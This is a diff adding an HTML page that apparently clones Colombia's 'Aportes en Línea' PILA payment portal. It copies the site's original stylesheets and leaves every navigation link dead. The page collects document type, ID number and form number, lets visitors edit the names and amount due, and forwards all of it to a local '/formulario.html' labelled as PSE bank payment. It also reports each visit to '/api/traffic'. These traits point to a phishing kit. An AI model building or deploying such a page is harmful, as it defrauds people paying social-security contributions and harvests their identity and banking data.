@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pago Electrónico — Aportes en Línea | Paga tu planilla PILA en línea</title>
+<meta name="description" content="Realiza el pago de tus aportes de seguridad social: planilla PILA, aportes como independiente, empresa o doméstico. Paga en línea con PSE, tarjeta o transferencia.">
+<meta name="theme-color" content="#012D25">
+<link rel="icon" type="image/x-icon" href="favicon.ico">
+<link rel="stylesheet" href="css/original/jquery-ui-custom.new-ui.css">
+<link rel="stylesheet" href="css/original/grid-system.css">
+<link rel="stylesheet" href="css/original/display-utils.css">
+<link rel="stylesheet" href="css/original/text-utils.css">
+<link rel="stylesheet" href="css/original/pop-up.css">
+<link rel="stylesheet" href="css/original/cards.css">
+<link rel="stylesheet" href="css/original/Autoservicio.css">
+<link rel="stylesheet" href="css/original/Menu.css">
+<link rel="stylesheet" href="css/original/NuevoHome.css">
+<link rel="stylesheet" href="css/original/otras-opciones.css">
+<link rel="stylesheet" href="css/original/Footer.css">
+<link rel="stylesheet" href="css/original/Modal.css">
+<link rel="stylesheet" href="css/portal.css">
+<link rel="stylesheet" crossorigin href="assets/index-ATFQZHbI.css">
+<style>
+.overlay-busqueda{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.95);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:9999;gap:20px}
+.overlay-busqueda.active{display:flex}
+.overlay-logo{width:140px;height:auto}
+.spinner-color{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #012D25;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.overlay-texto{color:#012D25;font-size:16px;font-weight:500;margin:0}
+.card-resultado{background:white;border-radius:16px;padding:28px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:560px;margin:0 auto}
+.card-resultado h3{color:#012D25;margin-bottom:16px;font-size:18px}
+.dato-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #eee;font-size:15px}
+.dato-row:last-child{border-bottom:none}
+.dato-label{color:#666}
+.dato-valor{font-weight:600;color:#333}
+.dato-valor.monto{color:#012D25;font-size:18px}
+.dato-editable{display:flex;align-items:center;gap:6px;justify-content:flex-end}
+.dato-editable input{border:none;border-bottom:1.5px dashed #012D25;background:transparent;font-weight:600;color:#333;font-size:15px;padding:2px 4px;outline:none;font-family:inherit;text-align:right;max-width:160px;width:auto}
+.dato-editable input.monto-input{color:#012D25;font-size:18px;font-weight:700;max-width:130px}
+.dato-editable input:focus{border-bottom-color:#024d3f;background:#f0f9f7}
+.icono-editar{width:14px;height:14px;cursor:pointer;opacity:.4;transition:opacity .2s;flex-shrink:0}
+.icono-editar:hover{opacity:1}
+.btn-verde{display:block;width:100%;padding:14px;background:#012D25;color:white;border:none;border-radius:25px;font-size:16px;font-weight:bold;cursor:pointer;text-align:center;margin-top:20px;text-decoration:none;transition:background .2s}
+.btn-verde:hover{background:#024d3f;color:white}
+.btn-outline{display:block;width:100%;padding:12px;background:white;color:#333;border:2px solid #ccc;border-radius:25px;font-size:15px;cursor:pointer;text-align:center;margin-top:12px;text-decoration:none}
+.metodo-pago{display:flex;align-items:center;border:2px solid #ddd;border-radius:12px;padding:16px 20px;text-decoration:none;color:#012D25;cursor:pointer;margin-bottom:12px;transition:all .2s;background:white}
+.metodo-pago:hover{border-color:#012D25;background:#f0f9f7}
+.metodo-pago img{width:55px;height:auto;margin-right:16px;flex-shrink:0}
+.metodo-pago .mp-titulo{font-weight:bold;font-size:16px;color:#012D25}
+.metodo-pago .mp-desc{font-size:13px;color:#555;margin-top:2px}
+.nota-pse{background:#f0f9f7;border-radius:8px;padding:12px 16px;font-size:13px;color:#555;margin-bottom:20px;border-left:3px solid #012D25}
+.pantalla{display:none}
+.pantalla.activa{display:block}
+</style>
+</head>
+<body>
+
+<div class="overlay-busqueda" id="overlay-carga">
+  <img src="img/logoAEL70.png" alt="Aportes en Línea" class="overlay-logo">
+  <div class="spinner-color"></div>
+  <p class="overlay-texto" id="overlay-texto">Consultando tu planilla…</p>
+</div>
+
+<nav aria-label="Páginas del sitio web" class="sort-pages modify-pages" id="navigation" role="navigation">
+    <div id="heading" class="heading">
+        <div class="site-title">
+            <a class="logo custom-logo" href="#" title="Ir a Aportes en linea">
+                <img alt="Aportes en linea" height="40" src="img/logoAEL70.png" width="116">
+            </a>
+        </div>
+    </div>
+    <div role="menu" class="headerCl">
+        <div class="pestaña pestañaActiva" id="layout_5">
+            <a aria-label="Ir al inicio" aria-haspopup="true" href="#" class="link-portal"><span>Empresas</span></a>
+        </div>
+        <div class="pestaña" id="layout_6"><a href="#" role="menuitem" class="link-portal"><span>Independientes</span></a></div>
+        <div class="pestaña" id="layout_8"><a href="#" role="menuitem" class="link-portal"><span>Administradoras</span></a></div>
+        <div class="pestaña" id="layout_11"><a href="#" role="menuitem" class="link-portal"><span>Datos en línea</span></a></div>
+    </div>
+    <div class="headerC3">
+        <div class="M-pagos">
+            <img src="img/dollar-circle.png" height="16" width="16" alt="icono dollar">
+            <a class="m-0 ml-2 text-dark" href="#">Medios de pago</a>
+            <img src="img/flecha.png" class="flechaMediosPago" alt="flecha" height="7" width="13">
+            <div class="ul-medios-de-pago"><a href="#">Presencial</a><a href="#">Electrónico</a></div>
+        </div>
+        <div class="C-ayuda">
+            <img src="img/info-circle.png" height="16" width="16" alt="icono informacion">
+            <p class="m-0 ml-2 text-dark"><a class="text-dark" href="#">Centro de ayuda</a></p>
+        </div>
+    </div>
+</nav>
+
+<nav class="submenu" aria-label="menu-navegacion">
+    <div class="lista-submenu">
+        <a href="#" role="menuitem">Inicio</a>
+        <a href="#" role="menuitem">Quiénes somos</a>
+        <span><a aria-haspopup="true" class="nav-link text-truncate dropdown-toggle itemNavSubMenu" role="menuitem">Productos </a><img src="img/flecha.png" class="desplegarListaProductos" alt="flecha" height="7" width="13"></span>
+        <ul class="ul-link-productos efect">
+            <li><a class="dropdown-item" href="#" role="menuitem">PILA</a></li>
+            <li><a class="dropdown-item" href="#" role="menuitem">Cesantías</a></li>
+            <li><a class="dropdown-item" href="#" role="menuitem">Pensiones voluntarias</a></li>
+            <li><a class="dropdown-item" href="#" role="menuitem">Nómina Electrónica</a></li>
+            <li><a class="dropdown-item" href="#">Nómina en línea</a></li>
+            <li><a class="dropdown-item" href="#" role="menuitem">Todos los productos</a></li>
+        </ul>
+        <span><a role="menuitem">Contáctenos</a><img src="img/flecha.png" class="flechaContactenos" alt="flecha" height="7" width="13"></span>
+        <ul class="lista-contactenos">
+            <li><a href="#" role="menuitem">Registre solicitudes</a></li>
+            <li><a href="#" role="menuitem">Consulte el estado de sus solicitudes</a></li>
+        </ul>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px">
+        <a id="btnRegistrarme" href="#" class="btn-registrate">Regístrate</a>
+        <a href="#" class="btn-ingresa-portal-transaccional">Ingresa al portal transaccional</a>
+    </div>
+</nav>
+
+<div class="nav-responsive">
+    <div class="link-ocultos"></div>
+    <div class="nav-container-iconos">
+        <div class="site-title"><a href="#"><img alt="" height="40" src="img/logoAEL70.png" width="116"></a></div>
+        <div>
+            <img src="img/iconMenu.png" width="24" height="24" class="icon-menu" id="mostrarMenu" alt="abrir menu">
+            <img src="img/cerrar.png" width="24" height="24" class="icon-menu" id="cerrarMenu" alt="cerrar menu">
+        </div>
+    </div>
+    <div class="menu-desplegable-responsive">
+        <div class="container-link-portales">
+            <a class="pestañaLink activeMobile" href="#">Empresas</a>
+            <a class="pestañaLink" href="#">Independientes</a>
+            <a class="pestañaLink" href="#">Administradoras</a>
+        </div>
+    </div>
+</div>
+
+<div id="NewUIBody" class="newui-body">
+    <header class="newui-header"><h2 class="title"></h2></header>
+    <main class="newui-main">
+
+        <div class="banner-header header-verde-oscuro">
+            <nav class="breadcrumbs" aria-label="breadcrumb">
+                <ol><li><a href="#">Inicio</a></li><li aria-current="page">Autoservicio - Pago electrónico</li></ol>
+            </nav>
+            <div class="header-titles-box">
+                <h1>Pago electrónico</h1>
+                <h2>Realiza el pago de tus aportes a través de la plataforma PSE.</h2>
+            </div>
+        </div>
+
+        <div id="ap-vista">
+
+            <!-- PANTALLA 1: CONSULTA -->
+            <div id="pantalla-consulta" class="pantalla activa">
+                <div class="body-container">
+                    <div class="floating-form">
+                        <div class="row mb-4"><div class="col">
+                            <div class="form-title">Ingresa la siguiente información</div>
+                            <div class="form-subtitle">Selecciona el tipo de pago de aportes que deseas realizar:</div>
+                        </div></div>
+
+                        <div id="ap_divProducto" class="row">
+                            <div class="col xs-c5 os-1 hide-autoservice">
+                                <input value="Pila" name="apProduct" type="radio" id="ap_Pila" class="dn selector" checked="checked" aria-label="pila">
+                                <label for="ap_Pila" class="button">PILA</label>
+                            </div>
+                            <div class="col xs-c5 os-1 tab-ael">
+                                <input value="Cesantias" name="apProduct" type="radio" id="ap_Cesantias" class="dn selector" aria-label="cesantias">
+                                <label for="ap_Cesantias" class="button">Cesantías</label>
+                            </div>
+                        </div>
+
+                        <div class="row mt-2"><div class="col">
+                            <label for="ap_ddlTipoId">Tipo de documento</label>
+                            <select id="ap_ddlTipoId" class="form-control">
+                                <option value="1">Cédula de ciudadanía</option>
+                                <option value="2">Cédula de extranjería</option>
+                                <option value="3">NIT</option>
+                                <option value="5">Tarjeta de identidad</option>
+                                <option value="7">Pasaporte</option>
+                                <option value="8">Carnet diplomático</option>
+                                <option value="9">Salvoconducto</option>
+                                <option value="10">Permiso especial</option>
+                                <option value="11">Permiso por protección temporal</option>
+                                <option value="12">PEP-TUTOR</option>
+                            </select>
+                        </div></div>
+
+                        <div class="row mt-2"><div class="col">
+                            <label for="ap_txtNo">Número de documento</label>
+                            <input type="text" id="ap_txtNo" class="form-control" placeholder="Ingresa el número de documento" inputmode="numeric">
+                        </div></div>
+
+                        <div class="row mt-2"><div class="col">
+                            <label for="ap_txtClave">Número de la planilla</label>
+                            <div class="input-with-tooltip">
+                                <input type="text" maxlength="10" id="ap_txtClave" class="form-control" placeholder="Ingresa el número de la planilla">
+                            </div>
+                        </div></div>
+
+                        <div class="row mt-3 text-center"><div class="col">
+                            <input type="button" value="Pagar aportes" id="ap_btnSolicitar" class="btn btn-verde-oscuro" onclick="consultarPlanilla()">
+                        </div></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PANTALLA 2: RESULTADOS -->
+            <div id="pantalla-resultado" class="pantalla">
+                <div class="body-container" style="padding:20px">
+                    <div class="card-resultado">
+                        <h3>Información de tu planilla</h3>
+                        <div class="dato-row"><span class="dato-label">Tipo documento</span><span class="dato-valor" id="res-tipo-doc">-</span></div>
+                        <div class="dato-row"><span class="dato-label">Número documento</span><span class="dato-valor" id="res-documento">-</span></div>
+                        <div class="dato-row"><span class="dato-label">Nombres</span><span class="dato-valor dato-editable"><input type="text" id="res-nombres" value="-" placeholder="Ingresa nombres"><svg class="icono-editar" viewBox="0 0 24 24" fill="none" stroke="#012D25" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 3a2.85 2.85 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z"/><path d="m15 5 4 4"/></svg></span></div>
+                        <div class="dato-row"><span class="dato-label">Apellidos</span><span class="dato-valor dato-editable"><input type="text" id="res-apellidos" value="-" placeholder="Ingresa apellidos"><svg class="icono-editar" viewBox="0 0 24 24" fill="none" stroke="#012D25" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 3a2.85 2.85 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z"/><path d="m15 5 4 4"/></svg></span></div>
+                        <div class="dato-row"><span class="dato-label">Período</span><span class="dato-valor" id="res-periodo">-</span></div>
+                        <div class="dato-row"><span class="dato-label">N° Planilla</span><span class="dato-valor" id="res-planilla">-</span></div>
+                        <div class="dato-row"><span class="dato-label">Valor a pagar</span><span class="dato-valor dato-editable">$ <input type="text" id="res-valor" class="monto-input" value="" inputmode="numeric" placeholder="Ingresa el valor"><svg class="icono-editar" viewBox="0 0 24 24" fill="none" stroke="#012D25" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 3a2.85 2.85 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z"/><path d="m15 5 4 4"/></svg></span></div>
+                        <p class="nota-pse" style="margin-top:16px">El pago de tu planilla se realizará a través de PSE (Pagos Seguros en Línea).</p>
+                        <button class="btn-verde" onclick="actualizarMontoMedios();mostrarPantalla('pantalla-medios')">Realizar el pago de mi planilla</button>
+                        <button class="btn-outline" onclick="mostrarPantalla('pantalla-consulta')">Volver</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PANTALLA 3: MEDIOS DE PAGO -->
+            <div id="pantalla-medios" class="pantalla">
+                <div class="body-container" style="padding:20px">
+                    <div class="card-resultado">
+                        <h3>Realizar el pago</h3>
+                        <p style="color:#333;margin-bottom:20px;font-size:15px">Paga <b>$ <span id="mp-monto">0</span></b> de tu planilla N° <span id="mp-planilla">-</span> seleccionando el medio de pago:</p>
+
+                        <a href="#" id="btn-pse" class="metodo-pago" onclick="irAFormulario();return false;">
+                            <img src="pse.png" alt="PSE" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/PSE_logo.svg/200px-PSE_logo.svg.png'">
+                            <div>
+                                <div class="mp-titulo">Pago PSE</div>
+                                <div class="mp-desc">Paga desde tu cuenta bancaria con PSE</div>
+                            </div>
+                        </a>
+
+                        <button class="btn-outline" onclick="mostrarPantalla('pantalla-resultado')">Volver</button>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="container otras-opciones p-5">
+            <div class="row">
+                <div class="col-md-4 otras-opciones-text-panel">
+                    <h2>¿Tienes otro tipo de solicitud?</h2>
+                    <p>Selecciona la opción que más se ajuste a tu solicitud</p>
+                </div>
+                <div class="col-md-8 card-opcion-group">
+                    <div class="card-opcion"><a href="#" class="card-opcion-text"><img src="Autoservicio/resources/components/images/bitcoin-convert.png" decoding="async" loading="lazy" width="100" height="100" alt=""><div class="textoBotonMenuBanner">Liquida y paga tu planilla</div></a></div>
+                    <div class="card-opcion"><a href="#" class="card-opcion-text"><img src="Autoservicio/resources/components/images/archive-add.png" decoding="async" loading="lazy" width="100" height="100" alt=""><div class="textoBotonMenuBanner">Certificado de aportes</div></a></div>
+                    <div class="card-opcion"><a href="#" class="card-opcion-text"><img src="Autoservicio/resources/components/images/document-sketch.png" decoding="async" loading="lazy" width="100" height="100" alt=""><div class="textoBotonMenuBanner">Soporte de pago</div></a></div>
+                    <div class="card-opcion"><a href="#" class="card-opcion-text"><img src="Autoservicio/resources/components/images/archive-tick.png" decoding="async" loading="lazy" width="100" height="100" alt=""><div class="textoBotonMenuBanner">Verificar la validez de una planilla</div></a></div>
+                    <div class="card-opcion"><a href="#" class="card-opcion-text"><img src="Autoservicio/resources/components/images/bitcoin-convert.png" decoding="async" loading="lazy" width="100" height="100" alt=""><div class="textoBotonMenuBanner">Pago electrónico - PSE</div></a></div>
+                    <div class="card-opcion"><a href="#" class="card-opcion-text"><img src="Autoservicio/resources/components/images/folder-favorite.png" decoding="async" loading="lazy" width="100" height="100" alt=""><div class="textoBotonMenuBanner">Contribución solidaria</div></a></div>
+                    <div class="card-opcion"><a href="#" class="card-opcion-text"><img src="Autoservicio/resources/components/images/document-sketch.png" decoding="async" loading="lazy" width="100" height="100" alt=""><div class="textoBotonMenuBanner">Declaración de Renta</div></a></div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+</div>
+
+<footer id="footer" role="contentinfo">
+    <div>
+        <div class="container-fluid footertol footerDesktop">
+            <div class="footerRow2"><div class="footerWrap2"><div class="footerRow22">
+                <div class="footerCol"><img src="img/LogoAportesBlanco.png" width="185" height="64" alt="logo aportes en linea"></div>
+                <div class="footerCol">
+                    <h3 class="fontTitleFooter" style="color:white">Ayuda</h3><br>
+                    <p><a class="fontFooterList" href="#">Centro de ayuda</a></p>
+                    <p><a class="fontFooterList" href="#">Preguntas frecuentes</a></p>
+                    <p><a class="fontFooterList" href="#">Registre solicitudes</a></p>
+                    <p><a class="fontFooterList" href="#">Consulte el estado de sus solicitudes</a></p>
+                </div>
+                <div class="footerCol">
+                    <h3 class="fontTitleFooter" style="color:white">Políticas</h3><br>
+                    <p><a class="fontFooterList" href="#">Políticas de cookies</a></p>
+                    <p><a class="fontFooterList" href="#">Protección de datos</a></p>
+                    <p><a class="fontFooterList" href="#">Términos y condiciones</a></p>
+                </div>
+                <div class="footerCol" id="col3Ap"><div class="mt-5"><ul class="justSocial">
+                    <li class="mx-2"><a href="#"><img alt="facebook" src="img/facebookBlanco.png" width="24" height="24"></a></li>
+                    <li class="mx-2"><a href="#"><img alt="X" src="img/twitter.png" width="24" height="24"></a></li>
+                    <li class="mx-2"><a href="#"><img alt="Instagram" src="img/instagram.png" width="24" height="24"></a></li>
+                    <li class="mx-2"><a href="#"><img alt="LinkedIn" src="img/linkedinBlanco.png" width="24" height="24"></a></li>
+                </ul></div></div>
+            </div><div><p class="fontCopy">Copyright © 2026 Aportes en Línea</p></div></div></div>
+        </div>
+    </div>
+</footer>
+
+<script>
+var datosConsulta = {};
+
+function formatoMiles(n) {
+    var num = String(n).replace(/[^\d]/g, '');
+    if (!num) return '';
+    return num.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+}
+
+function mostrarPantalla(id) {
+    document.querySelectorAll('.pantalla').forEach(function(p){ p.classList.remove('activa'); });
+    document.getElementById(id).classList.add('activa');
+    window.scrollTo(0, 0);
+}
+
+function consultarPlanilla() {
+    var tipoDoc = document.getElementById('ap_ddlTipoId').value;
+    var tipoDocTexto = document.getElementById('ap_ddlTipoId').options[document.getElementById('ap_ddlTipoId').selectedIndex].text;
+    var numDoc = document.getElementById('ap_txtNo').value.trim();
+    var planilla = document.getElementById('ap_txtClave').value.trim();
+    var tipoPago = document.querySelector('input[name="apProduct"]:checked');
+    var tipoPagoVal = tipoPago ? tipoPago.value : 'Pila';
+
+    if (!numDoc) { alert('Ingresa el número de documento.'); return; }
+    if (!planilla) { alert('Ingresa el número de la planilla.'); return; }
+
+    document.getElementById('overlay-carga').classList.add('active');
+    document.getElementById('overlay-texto').textContent = 'Consultando tu planilla…';
+
+    var url = '/consulta-planilla?tipo_documento=' + encodeURIComponent(tipoDoc)
+        + '&documento=' + encodeURIComponent(numDoc)
+        + '&planilla=' + encodeURIComponent(planilla)
+        + '&tipo_pago=' + encodeURIComponent(tipoPagoVal);
+
+    fetch(url)
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            datosConsulta = data;
+            datosConsulta._tipoDocTexto = tipoDocTexto;
+            datosConsulta._documento = numDoc;
+            datosConsulta._planilla = planilla;
+
+            document.getElementById('res-tipo-doc').textContent = tipoDocTexto;
+            document.getElementById('res-documento').textContent = numDoc;
+            document.getElementById('res-nombres').value = data.nombres || data.nombre || '';
+            document.getElementById('res-apellidos').value = data.apellidos || '';
+            document.getElementById('res-periodo').textContent = data.periodo || '-';
+            document.getElementById('res-planilla').textContent = data.numero_planilla || planilla;
+            var valor = data.valor || 0;
+            document.getElementById('res-valor').value = formatoMiles(valor);
+            document.getElementById('mp-monto').textContent = formatoMiles(valor);
+            document.getElementById('mp-planilla').textContent = data.numero_planilla || planilla;
+            // Si no trajo nombres, enfocar el campo para que lo llene
+            if (!data.nombres && !data.nombre) {
+                setTimeout(function(){ document.getElementById('res-nombres').focus(); }, 900);
+            }
+
+            setTimeout(function() {
+                document.getElementById('overlay-carga').classList.remove('active');
+                mostrarPantalla('pantalla-resultado');
+            }, 800);
+        })
+        .catch(function(err) {
+            document.getElementById('overlay-carga').classList.remove('active');
+            alert('Error al consultar la planilla. Verifica los datos e intenta de nuevo.');
+        });
+}
+
+function actualizarMontoMedios() {
+    var val = document.getElementById('res-valor').value;
+    document.getElementById('mp-monto').textContent = val;
+}
+
+function irAFormulario() {
+    // Leer valores editables (el usuario pudo modificarlos)
+    var nombres = document.getElementById('res-nombres').value.trim();
+    var apellidos = document.getElementById('res-apellidos').value.trim();
+    var nombre = (nombres + ' ' + apellidos).trim();
+    var doc = document.getElementById('res-documento').textContent.trim();
+    var valorRaw = document.getElementById('res-valor').value.replace(/\./g, '').replace(/,/g, '').replace(/[^\d]/g, '');
+    var monto = valorRaw || datosConsulta.valor || '';
+    var planilla = datosConsulta.numero_planilla || datosConsulta._planilla || '';
+    window.location.href = '/formulario.html?monto=' + encodeURIComponent(monto)
+        + '&planilla=' + encodeURIComponent(planilla)
+        + '&nombre=' + encodeURIComponent(nombre)
+        + '&documento=' + encodeURIComponent(doc);
+}
+
+// Auto-formatear valor con punto de miles al escribir
+document.getElementById('res-valor').addEventListener('input', function() {
+    var pos = this.selectionStart;
+    var antesLen = this.value.length;
+    this.value = formatoMiles(this.value);
+    var diff = this.value.length - antesLen;
+    this.setSelectionRange(pos + diff, pos + diff);
+});
+
+// Clic en lápiz → enfocar el input de esa fila
+document.querySelectorAll('.icono-editar').forEach(function(icon) {
+    icon.addEventListener('click', function() {
+        var input = this.parentElement.querySelector('input');
+        if (input) { input.focus(); input.select(); }
+    });
+});
+
+// Notificar ingreso
+fetch('/api/traffic', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({tipo:'aportes',evento:'ingreso'})}).catch(function(){});
+</script>
+</body>
+</html>
